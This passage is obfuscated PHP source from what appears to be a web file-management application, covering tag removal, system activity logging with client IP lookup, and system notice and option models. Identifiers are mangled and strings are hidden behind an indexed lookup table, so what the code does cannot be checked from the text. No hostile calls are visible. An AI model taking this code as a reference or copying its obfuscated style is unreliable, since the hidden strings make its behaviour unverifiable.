array(); foreach ($Ù—öÁÀæ as $—›š¸’ => $‰“ç£îÆ) { $Ê—˜îÌƒ = !0; if (!$ÊÄùâö¬) { $à°ÛÚò×[] = $—›š¸’; continue; } foreach ($ÊÄùâö¬ as $È…ñµâ¨) { if (!in_array($È…ñµâ¨, $‰“ç£îÆ)) { $Ê—˜îÌƒ = !1; break; } } if ($Ê—˜îÌƒ) { $à°ÛÚò×[] = $—›š¸’; } } if (!$à°ÛÚò×) { return array(); } $ÍåÊö‡ = array($–É°»‘[502] => array($–É°»‘[503], $à°ÛÚò×), $–É°»‘[585] => $†ÇúØÔ, $–É°»‘[189] => SourceModel::TYPE_GROUP); $îëŠİã = Model($–É°»‘[1469])->listSource($ÍåÊö‡); if (!$îëŠİã || count($à°ÛÚò×) == $îëŠİã[$–É°»‘[443]][$–É°»‘[444]]) { return $îëŠİã; } $À½ÌåœÏ = array(); $¿ëëÖú = array_to_keyvalue($îëŠİã[$–É°»‘[85]], $–É°»‘[12], $–É°»‘[192]); $÷×ºä¶ = array_to_keyvalue($îëŠİã[$–É°»‘[86]], $–É°»‘[12], $–É°»‘[192]); $Çªä¿ïÛ = array_merge($÷×ºä¶, $¿ëëÖú); foreach ($à°ÛÚò× as $«Ü¢³…) { if (!in_array($«Ü¢³…, $Çªä¿ïÛ)) { $À½ÌåœÏ[] = $«Ü¢³…; } } if ($À½ÌåœÏ) { $this->removeBySource($†ÇúØÔ, $À½ÌåœÏ); } return $îëŠİã; } protected function addToTag($ª½²Ó£«, $»¾¥€à®, $»Õ‡¬ÅÀ) { $±îÄ¹²å =& $_SERVER[¿ÈˆÑ¸ä]; if (!$this->getByTagID($ª½²Ó£«, $»Õ‡¬ÅÀ) || !$»¾¥€à®) { return !1; } if (!Model($±îÄ¹²å[916])->pathInfo($»¾¥€à®)) { return !1; } $§ŞÃÆà× = array($±îÄ¹²å[1907] => 0, $±îÄ¹²å[569] => $»Õ‡¬ÅÀ, $±îÄ¹²å[506] => $»¾¥€à®, $±îÄ¹²å[507] => $±îÄ¹²å[2241] . $ª½²Ó£«, $±îÄ¹²å[505] => $±îÄ¹²å[12], $±îÄ¹²å[2126] => 0); if ($this->where($§ŞÃÆà×)->find()) { return !1; } return $this->add($§ŞÃÆà×); } protected function removeFromTag($ãŞÛÉ›ê, $áÆ™ş˜Ú, $‘»Èî’¶) { $˜ åÍÚõ =& $_SERVER[¿ÈˆÑ¸ä]; if (!$this->getByTagID($ãŞÛÉ›ê, $‘»Èî’¶) || !$áÆ™ş˜Ú) { return !1; } if (is_array($áÆ™ş˜Ú)) { $áÆ™ş˜Ú = array($˜ åÍÚõ[7], $áÆ™ş˜Ú); } $€ˆŠÜ¦Ê = array($˜ åÍÚõ[1907] => 0, $˜ åÍÚõ[569] => $‘»Èî’¶, $˜ åÍÚõ[507] => $˜ åÍÚõ[2241] . $ãŞÛÉ›ê, $˜ åÍÚõ[506] => $áÆ™ş˜Ú); return $this->where($€ˆŠÜ¦Ê)->delete(); } protected function removeByTag($å¦™³ß, $·Ñ¬Âšä) { $‰–±ª¨ =& $_SERVER[¿ÈˆÑ¸ä]; if (!$this->getByTagID($å¦™³ß, $·Ñ¬Âšä)) { return !1; } $­«Ìµ‚Ê = array($‰–±ª¨[1907] => 0, $‰–±ª¨[569] => $·Ñ¬Âšä, $‰–±ª¨[507] => $‰–±ª¨[2241] . $å¦™³ß); return $this->where($­«Ìµ‚Ê)->delete(); } protected function removeBySource($ø™ùì÷í, $ıõ½“è—) { $ŞóµÒ§« =& $_SERVER[¿ÈˆÑ¸ä]; if (!$ø™ùì÷í || !$ıõ½“è—) { return !1; } if (is_array($ıõ½“è—)) { $ıõ½“è— = array($ŞóµÒ§«[7], $ıõ½“è—); } $íÅ“­¡ = array($ŞóµÒ§«[1907] => 0, $ŞóµÒ§«[506] => $ıõ½“è—, $ŞóµÒ§«[569] => array($ŞóµÒ§«[1117], 0), $ŞóµÒ§«[507] => $ŞóµÒ§«[2241] . $ø™ùì÷í); return $this->where($íÅ“­¡)->delete(); } } goto fÎÑ•Ü¾; aß–Ö¦ë÷Ê: class SystemLogModel extends ModelBase { protected $tableName = "\x73\171\163\x74\145\155\x5f\154\x6f\147"; protected $dataAuto = array(array("\x63\162\145\141\164\145\124\151\x6d\x65", "\x74\x69\x6d\145", "\151\156\x73\145\x72\x74", "\x66\x75\156\x63\x74\151\157\156")); public $typeList; function __construct() { parent::__construct(); $this->typeList = $this->typeListAll(); } public function typeListAll() { $ÜÃ—¯É³ =& $_SERVER[¿ÈˆÑ¸ä]; return array($ÜÃ—¯É³[2493] => LNG($ÜÃ—¯É³[2494]), $ÜÃ—¯É³[2495] => LNG($ÜÃ—¯É³[2496]), $ÜÃ—¯É³[2068] => LNG($ÜÃ—¯É³[2497]), $ÜÃ—¯É³[2498] => LNG($ÜÃ—¯É³[2499]), $ÜÃ—¯É³[2500] => LNG($ÜÃ—¯É³[2501]), $ÜÃ—¯É³[2502] => LNG($ÜÃ—¯É³[2503]), $ÜÃ—¯É³[2504] => LNG($ÜÃ—¯É³[2505]), $ÜÃ—¯É³[2096] => LNG($ÜÃ—¯É³[2505]), $ÜÃ—¯É³[2097] => LNG($ÜÃ—¯É³[2506]), $ÜÃ—¯É³[2507] => LNG($ÜÃ—¯É³[2508]), $ÜÃ—¯É³[2509] => LNG($ÜÃ—¯É³[2510]), $ÜÃ—¯É³[2511] => LNG($ÜÃ—¯É³[2512]), $ÜÃ—¯É³[2513] => LNG($ÜÃ—¯É³[2514]), $ÜÃ—¯É³[2094] => LNG($ÜÃ—¯É³[2515]), $ÜÃ—¯É³[2516] => LNG($ÜÃ—¯É³[2517]), $ÜÃ—¯É³[2101] => LNG($ÜÃ—¯É³[2518]), $ÜÃ—¯É³[2519] => LNG($ÜÃ—¯É³[2520]), $ÜÃ—¯É³[2521] => LNG($ÜÃ—¯É³[2522]), $ÜÃ—¯É³[2523] => LNG($ÜÃ—¯É³[2524]), $ÜÃ—¯É³[2525] => LNG($ÜÃ—¯É³[2526]), $ÜÃ—¯É³[2103] => LNG($ÜÃ—¯É³[2527]), $ÜÃ—¯É³[2104] => LNG($ÜÃ—¯É³[2528]), $ÜÃ—¯É³[2529] => LNG($ÜÃ—¯É³[2530]), $ÜÃ—¯É³[2531] => LNG($ÜÃ—¯É³[2532]), $ÜÃ—¯É³[2533] => LNG($ÜÃ—¯É³[2534]), $ÜÃ—¯É³[2099] => LNG($ÜÃ—¯É³[2535]), $ÜÃ—¯É³[2536] => LNG($ÜÃ—¯É³[2537]), $ÜÃ—¯É³[2098] => LNG($ÜÃ—¯É³[2538]), $ÜÃ—¯É³[2539] => LNG($ÜÃ—¯É³[2539]), $ÜÃ—¯É³[2540] => LNG($ÜÃ—¯É³[2541]), $ÜÃ—¯É³[2542] => LNG($ÜÃ—¯É³[2539]), $ÜÃ—¯É³[2543] => LNG($ÜÃ—¯É³[2544]), $ÜÃ—¯É³[2545] => LNG($ÜÃ—¯É³[2546]), $ÜÃ—¯É³[2547] => LNG($ÜÃ—¯É³[2546]), $ÜÃ—¯É³[2548] => LNG($ÜÃ—¯É³[2549]), $ÜÃ—¯É³[2550] => LNG($ÜÃ—¯É³[2550]), $ÜÃ—¯É³[2551] => LNG($ÜÃ—¯É³[2072]), $ÜÃ—¯É³[2552] => LNG($ÜÃ—¯É³[2553]), $ÜÃ—¯É³[2554] => LNG($ÜÃ—¯É³[2555]), $ÜÃ—¯É³[2556] => LNG($ÜÃ—¯É³[2557]), $ÜÃ—¯É³[2558] => LNG($ÜÃ—¯É³[2559]), $ÜÃ—¯É³[2560] => LNG($ÜÃ—¯É³[2561]), $ÜÃ—¯É³[2562] => LNG($ÜÃ—¯É³[2562]), $ÜÃ—¯É³[2563] => LNG($ÜÃ—¯É³[2564]), $ÜÃ—¯É³[2565] => LNG($ÜÃ—¯É³[2566]), $ÜÃ—¯É³[2567] => LNG($ÜÃ—¯É³[2568]), $ÜÃ—¯É³[2569] => LNG($ÜÃ—¯É³[2570]), $ÜÃ—¯É³[2571] => LNG($ÜÃ—¯É³[2572]), $ÜÃ—¯É³[2573] => LNG($ÜÃ—¯É³[2574]), $ÜÃ—¯É³[211] => LNG($ÜÃ—¯É³[211]), $ÜÃ—¯É³[212] => LNG($ÜÃ—¯É³[2575]), $ÜÃ—¯É³[2576] => LNG($ÜÃ—¯É³[2576])); } private function typeFile() { $¼•…ÊŒ¸ =& $_SERVER[¿ÈˆÑ¸ä]; $İ¯ò ôı = array($¼•…ÊŒ¸[2101] => array($¼•…ÊŒ¸[2102]), $¼•…ÊŒ¸[2511] => array($¼•…ÊŒ¸[2577]), $¼•…ÊŒ¸[2513] => array($¼•…ÊŒ¸[2578]), $¼•…ÊŒ¸[2094] => array($¼•…ÊŒ¸[2095], $¼•…ÊŒ¸[2579]), $¼•…ÊŒ¸[2521] => array(), $¼•…ÊŒ¸[2523] => array(), $¼•…ÊŒ¸[2525] => array(), $¼•…ÊŒ¸[2103] => array($¼•…ÊŒ¸[2105]), $¼•…ÊŒ¸[2104] => array($¼•…ÊŒ¸[2105]), $¼•…ÊŒ¸[2529] => array($¼•…ÊŒ¸[2580]), $¼•…ÊŒ¸[2531] => array($¼•…ÊŒ¸[2580]), $¼•…ÊŒ¸[2533] => array($¼•…ÊŒ¸[2581]), $¼•…ÊŒ¸[2519] => array($¼•…ÊŒ¸[2582]), $¼•…ÊŒ¸[2099] => array($¼•…ÊŒ¸[2583]), $¼•…ÊŒ¸[2536] => array($¼•…ÊŒ¸[2584]), $¼•…ÊŒ¸[2098] => array($¼•…ÊŒ¸[2100])); return $İ¯ò ôı; } private function typeAll() { $”ÄˆÂ¢ı =& $_SERVER[¿ÈˆÑ¸ä]; $‹­•ğÅ² = $this->typeList; $Ê­¥äÉ‹ = array_filter($this->typeFile()); foreach ($Ê­¥äÉ‹ as $ªÑ›ĞÎ— => $•ÉêûÅ) { $‹­•ğÅ²[$•ÉêûÅ[0]] = $‹­•ğÅ²[$ªÑ›ĞÎ—]; } $‹­•ğÅ²[$”ÄˆÂ¢ı[2105]] = LNG($”ÄˆÂ¢ı[2585]); $‹­•ğÅ²[$”ÄˆÂ¢ı[2580]] = LNG($”ÄˆÂ¢ı[2586]); return $‹­•ğÅ²; } public function addLog($²ÁÂñÖÜ, $×òÂŒŸ = array()) { $÷ï¶¼¦ =& $_SERVER[¿ÈˆÑ¸ä]; if (!isset($this->typeList[$²ÁÂñÖÜ])) { return; } $­“üÆ©ú = Session::get($÷ï¶¼¦[2259]); if (!$­“üÆ©ú) { $­“üÆ©ú = _get($×òÂŒŸ, $÷ï¶¼¦[1529], 0); } if ($²ÁÂñÖÜ == $÷ï¶¼¦[2552] && is_array($×òÂŒŸ[$÷ï¶¼¦[2587]]) && !$×òÂŒŸ[$÷ï¶¼¦[2587]]) { return; } $á–¼óÁ˜ = get_client_ip(); if (!$×òÂŒŸ || strlen(json_encode($×òÂŒŸ)) >= 1024 * 64) { if ($×òÂŒŸ && is_array($×òÂŒŸ)) { $×òÂŒŸ = array_intersect_key($×òÂŒŸ, array_flip($÷ï¶¼¦[483], $÷ï¶¼¦[32])); $×òÂŒŸ[$÷ï¶¼¦[1545]] = $á–¼óÁ˜; } else { $×òÂŒŸ = array($÷ï¶¼¦[1545] => $á–¼óÁ˜); } } else { if (is_array($×òÂŒŸ)) { $×òÂŒŸ[$÷ï¶¼¦[1545]] = $á–¼óÁ˜; } else { $×òÂŒŸ = array($÷ï¶¼¦[1326] => $×òÂŒŸ, $÷ï¶¼¦[1545] => $á–¼óÁ˜); } } $×òÂŒŸ[$÷ï¶¼¦[2588]] = ACTION; $×òÂŒŸ = array($÷ï¶¼¦[1906] => Session::sign(), $÷ï¶¼¦[1907] => intval($­“üÆ©ú), $÷ï¶¼¦[33] => $²ÁÂñÖÜ, $÷ï¶¼¦[1909] => json_encode($×òÂŒŸ)); Hook::trigger($÷ï¶¼¦[2589], $×òÂŒŸ); return parent::add($×òÂŒŸ); } public function remove($ÍêœÏ) { $this->where(array($_SERVER[¿ÈˆÑ¸ä][504] => $ÍêœÏ))->delete(); } private function _makeOrder($Û˜Õß¨½ = '') { $Ëİƒğ¹ =& $_SERVER[¿ÈˆÑ¸ä]; $˜»ÑÏ§ = $Ëİƒğ¹[232]; $«Ï¦Ù½ = array($Ëİƒğ¹[533] => $Ëİƒğ¹[534], $Ëİƒğ¹[535] => $Ëİƒğ¹[536]); $™õèšÉæ = Input::get($Ëİƒğ¹[541], $Ëİƒğ¹[7], $Ëİƒğ¹[2297], array($Ëİƒğ¹[2215], $Ëİƒğ¹[535])); $™õèšÉæ = $«Ï¦Ù½[$™õèšÉæ]; $Û˜Õß¨½ = $Û˜Õß¨½ . "{$˜»ÑÏ§}\x20{$™õèšÉæ}"; return $this->order($Û˜Õß¨½); } public function get($î™¡ÜÁš = '') { $Ï•íîª± =& $_SERVER[¿ÈˆÑ¸ä]; if (!$î™¡ÜÁš) { show_json(array()); } $Ş¨®õ°Ö = array(); if ($î™¡ÜÁš[$Ï•íîª±[1529]]) { $Ş¨®õ°Ö[$Ï•íîª±[1529]] = $î™¡ÜÁš[$Ï•íîª±[1529]]; } if (isset($î™¡ÜÁš[$Ï•íîª±[844]])) { $…Üœ¿ßú = $î™¡ÜÁš[$Ï•íîª±[844]]; $‹Ì†ó¨È = isset($î™¡ÜÁš[$Ï•íîª±[845]]) ? $î™¡ÜÁš[$Ï•íîª±[845]] : time(); $Ş¨®õ°Ö[$Ï•íîª±[232]] = array($Ï•íîª±[409], array($…Üœ¿ßú, $‹Ì†ó¨È)); } if ($î™¡ÜÁš[$Ï•íîª±[33]]) { $¯åçÏ“Â = explode($Ï•íîª±[50], $î™¡ÜÁš[$Ï•íîª±[33]]); $¡¤‚„á‹ = $this->typeFile(); $€şøÁ¼ = array(); foreach ($¯åçÏ“Â as $Á Ø•Áµ) { $€şøÁ¼[] = $Á Ø•Áµ; if (isset($¡¤‚„á‹[$Á Ø•Áµ])) { $€şøÁ¼ = array_merge($€şøÁ¼, $¡¤‚„á‹[$Á Ø•Áµ]); } } $€şøÁ¼ = array_unique($€şøÁ¼); if ($€şøÁ¼) { $Ş¨®õ°Ö[$Ï•íîª±[33]] = array($Ï•íîª±[7], $€şøÁ¼); } } else { $Ş¨®õ°Ö[$Ï•íîª±[33]] = array($Ï•íîª±[2590], $Ï•íîª±[2591]); } if (!empty($î™¡ÜÁš[$Ï•íîª±[1545]])) { $Ş¨®õ°Ö[$Ï•íîª±[536]] = array($Ï•íîª±[470], "\x25{$î™¡ÜÁš[$Ï•íîª±[1545]]}\45"); } $ãÑĞË‚« = $this->_makeOrder()->where($Ş¨®õ°Ö)->selectPage(); if (empty($ãÑĞË‚«[$Ï•íîª±[446]])) { show_json(array(), !0, $ãÑĞË‚«[$Ï•íîª±[443]]); } $ãÑĞË‚«[$Ï•íîª±[446]] = $this->logList($ãÑĞË‚«[$Ï•íîª±[446]]); return $ãÑĞË‚«; } private function ipAddress(&$Æ„šó­€) { $î©‚¼Œú =& $_SERVER[¿ÈˆÑ¸ä]; if (!empty($Æ„šó­€[$î©‚¼Œú[1545]])) { $¥—èÍàš = IpLocation::get($Æ„šó­€[$î©‚¼Œú[1545]]); } else { $¥—èÍàš = LNG($î©‚¼Œú[2592]); } $Æ„šó­€[$î©‚¼Œú[2593]] = $¥—èÍàš; } private function descZipDownload($¹–‚‰Ší, &$ÀúåŠò) { $¿Ø¥€ÎÏ =& $_SERVER[¿ÈˆÑ¸ä]; if (!isset($¹–‚‰Ší[$¿Ø¥€ÎÏ[1552]])) { return; } $Ë×‡æêè = json_decode($¹–‚‰Ší[$¿Ø¥€ÎÏ[1552]], !0); foreach ($Ë×‡æêè as $üÏŒ¢ï) { try { $ÄÚ¹ƒ = IO::infoFullSimple($üÏŒ¢ï[$¿Ø¥€ÎÏ[87]]); } catch (Exception $†Ô¦îÍì) { continue; } $¹–‚‰Ší[$¿Ø¥€ÎÏ[87]] = $üÏŒ¢ï[$¿Ø¥€ÎÏ[87]]; $ÀúåŠò[] = $¹–‚‰Ší[$¿Ø¥€ÎÏ[192]] = $ÄÚ¹ƒ[$¿Ø¥€ÎÏ[192]]; $ÀúåŠò[] = $¹–‚‰Ší[$¿Ø¥€ÎÏ[2357]] = $ÄÚ¹ƒ[$¿Ø¥€ÎÏ[191]]; break; } return $¹–‚‰Ší; } private function getSourceList(&$û—£Èò) { $‘‹ÅÄğí =& $_SERVER[¿ÈˆÑ¸ä]; $«äé¤²  = array(); foreach ($û—£Èò as $’ÑˆøôÍ => $¥¸Ï¡ğ¤) { $¿¾ŸÇö¾ = json_decode($¥¸Ï¡ğ¤[$‘‹ÅÄğí[536]], !0); if ($¥¸Ï¡ğ¤[$‘‹ÅÄğí[33]] == $‘‹ÅÄğí[2097]) { $¿¾ŸÇö¾ = $this->descZipDownload($¿¾ŸÇö¾, $«äé¤² ); $û—£Èò[$’ÑˆøôÍ][$‘‹ÅÄğí[536]] = json_encode($¿¾ŸÇö¾); continue; } if (strpos($¥¸Ï¡ğ¤[$‘‹ÅÄğí[33]], $‘‹ÅÄğí[2359]) !== 0) { if (!isset($¿¾ŸÇö¾[$‘‹ÅÄğí[87]]) || strpos($¥¸Ï¡ğ¤[$‘‹ÅÄğí[33]], $‘‹ÅÄğí[2594]) !== 0) { continue; } try { $Å¶š‘€Å = IO::infoFullSimple($¿¾ŸÇö¾[$‘‹ÅÄğí[87]]); } catch (Exception $âüÙÚ›¤) { continue; } $«äé¤² [] = $¿¾ŸÇö¾[$‘‹ÅÄğí[192]] = $Å¶š‘€Å[$‘‹ÅÄğí[192]]; $«äé¤² [] = $¿¾ŸÇö¾[$‘‹ÅÄğí[2357]] = $Å¶š‘€Å[$‘‹ÅÄğí[191]]; $û—£Èò[$’ÑˆøôÍ][$‘‹ÅÄğí[536]] = json_encode($¿¾ŸÇö¾); continue; } $«äé¤² [] = $¿¾ŸÇö¾[$‘‹ÅÄğí[192]]; $«äé¤² [] = $¿¾ŸÇö¾[$‘‹ÅÄğí[2357]]; if ($¿¾ŸÇö¾[$‘‹ÅÄğí[33]] == $‘‹ÅÄğí[639]) { $«äé¤² [] = $¿¾ŸÇö¾[$‘‹ÅÄğí[536]][$‘‹ÅÄğí[1279]]; $«äé¤² [] = $¿¾ŸÇö¾[$‘‹ÅÄğí[536]][$‘‹ÅÄğí[1280]]; } if ($¿¾ŸÇö¾[$‘‹ÅÄğí[33]] == $‘‹ÅÄğí[2367]) { $«äé¤² [] = $¿¾ŸÇö¾[$‘‹ÅÄğí[536]][$‘‹ÅÄğí[192]]; } } if (!$«äé¤² ) { return array(); } return Model($‘‹ÅÄğí[916])->sourceListInfo($«äé¤² , !0); } private function logList($©ÑÅ•­é) { $±õ¹ú =& $_SERVER[¿ÈˆÑ¸ä]; $åƒ•ëîü = array_to_keyvalue($©ÑÅ•­é, $±õ¹ú[12], $±õ¹ú[1529]); $Ü¤Â’„Î = Model($±õ¹ú[613])->userListInfo(array_unique($åƒ•ëîü)); $Á‰°öóƒ = $this->getSourceList($©ÑÅ•­é); $‹…»Äºæ = $this->typeAll(); $Æ³ËÙÂ = array(); $ëêı¤„ = array(); foreach ($©ÑÅ•­é as $ùĞ²¾Á¹ => $ºÆ„ªÑª) { $’ÒÜ²¿õ = $ºÆ„ªÑª[$±õ¹ú[33]]; $œ†”îÕü = isset($Ü¤Â’„Î[$ºÆ„ªÑª[$±õ¹ú[1529]]]) ? $Ü¤Â’„Î[$ºÆ„ªÑª[$±õ¹ú[1529]]] : !1; $»Ë­¾õ = strpos($’ÒÜ²¿õ, $±õ¹ú[2595]) === 0 ? LNG($±õ¹ú[2596]) : LNG($±õ¹ú[2592]); $ºÆ„ªÑª[$±õ¹ú[32]] = isset($œ†”îÕü[$±õ¹ú[32]]) ? $œ†”îÕü[$±õ¹ú[32]] : LNG($±õ¹ú[2592]); $ºÆ„ªÑª[$±õ¹ú[2418]] = isset($œ†”îÕü[$±õ¹ú[2418]]) ? $œ†”îÕü[$±õ¹ú[2418]] : $±õ¹ú[12]; $ºÆ„ªÑª[$±õ¹ú[1802]] = isset($‹…»Äºæ[$’ÒÜ²¿õ]) ? $‹…»Äºæ[$’ÒÜ²¿õ] : $»Ë­¾õ; $ºÆ„ªÑª[$±õ¹ú[2296]] = $œ†”îÕü; $„ïôº» = json_decode($ºÆ„ªÑª[$±õ¹ú[536]], !0); $ºÆ„ªÑª[$±õ¹ú[1545]] = isset($„ïôº»[$±õ¹ú[1545]]) ? $„ïôº»[$±õ¹ú[1545]] : $±õ¹ú[12]; $ºÆ„ªÑª[$±õ¹ú[2593]] = IpLocation::get($ºÆ„ªÑª[$±õ¹ú[1545]]); if (strpos($’ÒÜ²¿õ, $±õ¹ú[2359]) === 0 || isset($„ïôº»[$±õ¹ú[2357]])) { $„ïôº»[$±õ¹ú[90]] = $Á‰°öóƒ[$„ïôº»[$±õ¹ú[192]]]; $„ïôº»[$±õ¹ú[2372]] = $Á‰°öóƒ[$„ïôº»[$±õ¹ú[2357]]]; if ($„ïôº»[$±õ¹ú[33]] == $±õ¹ú[639]) { $„ïôº»[$±õ¹ú[536]][$±õ¹ú[1279]] = $Á‰°öóƒ[$„ïôº»[$±õ¹ú[536]][$±õ¹ú[1279]]]; $„ïôº»[$±õ¹ú[536]][$±õ¹ú[1280]] = $Á‰°öóƒ[$„ïôº»[$±õ¹ú[536]][$±õ¹ú[1280]]]; } if ($„ïôº»[$±õ¹ú[33]] == $±õ¹ú[2367]) { $„ïôº»[$±õ¹ú[536]][$±õ¹ú[192]] = $Á‰°öóƒ[$„ïôº»[$±õ¹ú[536]][$±õ¹ú[192]]]; } if ($„ïôº»[$±õ¹ú[33]] == $±õ¹ú[1267]) { $„ïôº»[$±õ¹ú[2372]] = $„ïôº»[$±õ¹ú[90]]; $„ïôº»[$±õ¹ú[2357]] = $„ïôº»[$±õ¹ú[2372]][$±õ¹ú[192]]; $„ïôº»[$±õ¹ú[90]] = !1; $„ïôº»[$±õ¹ú[192]] = $±õ¹ú[12]; } $ÉŞØÉİÓ = array($±õ¹ú[1267], $±õ¹ú[2355]); if (!in_array($„ïôº»[$±õ¹ú[33]], $ÉŞØÉİÓ)) { if ($„ïôº»[$±õ¹ú[90]] && $„ïôº»[$±õ¹ú[90]][$±õ¹ú[189]] == $±õ¹ú[190]) { $ëêı¤„[] = $ºÆ„ªÑª[$±õ¹ú[483]]; unset($©ÑÅ•­é[$ùĞ²¾Á¹]); continue; } if ($„ïôº»[$±õ¹ú[2372]] && $„ïôº»[$±õ¹ú[2372]][$±õ¹ú[189]] == $±õ¹ú[190]) { $ëêı¤„[] = $ºÆ„ªÑª[$±õ¹ú[483]]; unset($©ÑÅ•­é[$ùĞ²¾Á¹]); continue; } } } $ºÆ„ªÑª[$±õ¹ú[536]] = $„ïôº»; unset($ºÆ„ªÑª[$±õ¹ú[2597]]); $Æ³ËÙÂ[] = $ºÆ„ªÑª; } $this->clearSystemPathLog($ëêı¤„); return $Æ³ËÙÂ; } private function clearSystemPathLog($›ÊÅ½¶ç) { $Ò§õ¸ûº =& $_SERVER[¿ÈˆÑ¸ä]; if (count($›ÊÅ½¶ç) == 0) { return; } $‰³õ€Ãî = array($Ò§õ¸ûº[483] => array($Ò§õ¸ûº[7], array_unique($›ÊÅ½¶ç))); $this->where($‰³õ€Ãî)->delete(); } public function deviceList($†‰Ê²ï, $Ô³æÚà‹ = 0) { $å¼Ô¤…ï =& $_SERVER[¿ÈˆÑ¸ä]; $¹ÑÃ’ùİ = array($å¼Ô¤…ï[1529] => $†‰Ê²ï, $å¼Ô¤…ï[232] => array($å¼Ô¤…ï[1117], $Ô³æÚà‹), $å¼Ô¤…ï[33] => $å¼Ô¤…ï[2068]); $®â™Âêä = array(); $Ëú·È÷Å = $this->field($å¼Ô¤…ï[2598])->where($¹ÑÃ’ùİ)->order($å¼Ô¤…ï[2370])->limit(50)->select(); foreach ($Ëú·È÷Å as $”Ò‚•Íƒ => $íˆ†á¨ä) { if ($”Ò‚•Íƒ > 0 && abs($íˆ†á¨ä[$å¼Ô¤…ï[232]] - $Ëú·È÷Å[$”Ò‚•Íƒ - 1][$å¼Ô¤…ï[232]]) < 5) { continue; } $Ö·öÔ® = json_decode($íˆ†á¨ä[$å¼Ô¤…ï[536]], !0); $íˆ†á¨ä[$å¼Ô¤…ï[1545]] = isset($Ö·öÔ®[$å¼Ô¤…ï[1545]]) ? $Ö·öÔ®[$å¼Ô¤…ï[1545]] : $å¼Ô¤…ï[12]; unset($Ö·öÔ®[$å¼Ô¤…ï[1545]]); $öİ†±íÍ = $this->deviceType($Ö·öÔ®[$å¼Ô¤…ï[2360]]); if (isset($®â™Âêä[$öİ†±íÍ])) { continue; } $íˆ†á¨ä[$å¼Ô¤…ï[2593]] = IpLocation::get($íˆ†á¨ä[$å¼Ô¤…ï[1545]]); $íˆ†á¨ä[$å¼Ô¤…ï[536]] = $Ö·öÔ®; $®â™Âêä[$öİ†±íÍ] = $íˆ†á¨ä; } return array_values($®â™Âêä); } public function deviceType($€¿‰‚·Á) { return $€¿‰‚·Á; } } class SystemNoticeModel extends ModelBaseLight { public $optionType = "\123\x79\x73\x74\x65\155\x2e\x6e\157\x74\x69\x63\145\x4c\x69\163\x74"; public $field = array("\156\141\x6d\145", "\143\157\x6e\x74\x65\x6e\164", "\x61\165\x74\x68", "\155\157\x64\x65", "\164\x69\155\145", "\x74\x79\160\x65", "\x6c\x65\166\x65\x6c", "\x65\x6e\x61\x62\x6c\145", "\163\x6f\162\x74"); public function listData($¾ÏØ˜ô = false, $æù¦È€¼ = "\163\157\162\x74", $Î°âô¹¦ = false) { return parent::listData($¾ÏØ˜ô, $æù¦È€¼, $Î°âô¹¦); } public function add($ä†Ñ¥²) { $Ã©ğòÇé =& $_SERVER[¿ÈˆÑ¸ä]; $øµ¤ŸÃè = time(); if ($ä†Ñ¥²[$Ã©ğòÇé[16]] == $Ã©ğòÇé[2599]) { $øµ¤ŸÃè = strtotime($ä†Ñ¥²[$Ã©ğòÇé[205]]); } $ä†Ñ¥²[$Ã©ğòÇé[205]] = $øµ¤ŸÃè; return parent::insert($ä†Ñ¥²); } public function update($İŸò», $—®ÔÅß) { $µ¸Î„Ìˆ =& $_SERVER[¿ÈˆÑ¸ä]; $Ù­”ñªå = $this->listData($İŸò»); if (!$Ù­”ñªå) { return !1; } $Áã¢¼ÙÔ = time(); if ($—®ÔÅß[$µ¸Î„Ìˆ[16]] == $µ¸Î„Ìˆ[2599]) { $Áã¢¼ÙÔ = strtotime($—®ÔÅß[$µ¸Î„Ìˆ[205]]); } $—®ÔÅß[$µ¸Î„Ìˆ[205]] = $Áã¢¼ÙÔ; return parent::update($İŸò», $—®ÔÅß); } public function remove($ÃÚêÖôŠ) { $»ÔêŠ  = $this->listData($ÃÚêÖôŠ); if (!$»ÔêŠ  || $»ÔêŠ [$_SERVER[¿ÈˆÑ¸ä][190]]) { return !1; } return parent::remove($ÃÚêÖôŠ); } public function sort($ùüˆ™–Á, $‹½ÙãÆ„) { return parent::update($ùüˆ™–Á, $‹½ÙãÆ„); } public function enable($”Î³¯Ÿğ, $íãƒêÆ•) { return parent::update($”Î³¯Ÿğ, array($_SERVER[¿ÈˆÑ¸ä][2600] => $íãƒêÆ•)); } private function initUserOption() { $ÊÍŞ—‘ =& $_SERVER[¿ÈˆÑ¸ä]; $this->optionType = $ÊÍŞ—‘[2601]; $this->modelType = $ÊÍŞ—‘[2602]; $this->field = array($ÊÍŞ—‘[2603], $ÊÍŞ—‘[32], $ÊÍŞ—‘[205], $ÊÍŞ—‘[33], $ÊÍŞ—‘[2604], $ÊÍŞ—‘[833], $ÊÍŞ—‘[227]); } public function userNoticeGet($â»ÇÔûµ = false) { $this->initUserOption(); return parent::listData($â»ÇÔûµ, $_SERVER[¿ÈˆÑ¸ä][483], !0); } public function userNoticeAdd($îÌÏ•Æ˜) { $Ü›±¯à¼ =& $_SERVER[¿ÈˆÑ¸ä]; $this->initUserOption(); $Åİ†»Îê = $this->findByKey($Ü›±¯à¼[2603], $îÌÏ•Æ˜[$Ü›±¯à¼[483]]); if ($Åİ†»Îê) { return !0; } $ÁÏïÜ¯Ò = array($Ü›±¯à¼[2603] => $îÌÏ•Æ˜[$Ü›±¯à¼[483]], $Ü›±¯à¼[32] => $îÌÏ•Æ˜[$Ü›±¯à¼[32]], $Ü›±¯à¼[205] => $îÌÏ•Æ˜[$Ü›±¯à¼[205]], $Ü›±¯à¼[33] => isset($îÌÏ•Æ˜[$Ü›±¯à¼[33]]) ? $îÌÏ•Æ˜[$Ü›±¯à¼[33]] : 1, $Ü›±¯à¼[2604] => isset($îÌÏ•Æ˜[$Ü›±¯à¼[2604]]) ? $îÌÏ•Æ˜[$Ü›±¯à¼[2604]] : 0, $Ü›±¯à¼[833] => 0, $Ü›±¯à¼[227] => 0); return parent::insert($ÁÏïÜ¯Ò); } public function userNoticeEdit($“©õØÚ, $£÷ªæ”ş) { $this->initUserOption(); return parent::update($“©õØÚ, $£÷ªæ”ş); } } class SystemOptionModel extends ModelBaseOption { protected $tableName = "\x73\x79\163\164\x65\x6d\137\x6f\x70\x74\151\x6f\x6e"; protected $jsonField = array("\155\145\x6e\x75", "\x72\x6f\154\145", "\x72\x6f\x6c\145\107\162\157\165\x70", "\162\x65\147\x69\163\164", "\x65\x6d\141\x69\x6c"); function __construct() { parent::__construct(); } protected function cacheKey($ä¾àµ) { return "\x53\x79\163\164\145\155\x4f\160\x74\x69\157\156\137{$ä¾àµ}"; } protected function optionDefault($ÁÍÓ´‘Ñ = '') { $ß’…–‚Ó =& $_SERVER[¿ÈˆÑ¸ä]; if ($ÁÍÓ´‘Ñ == 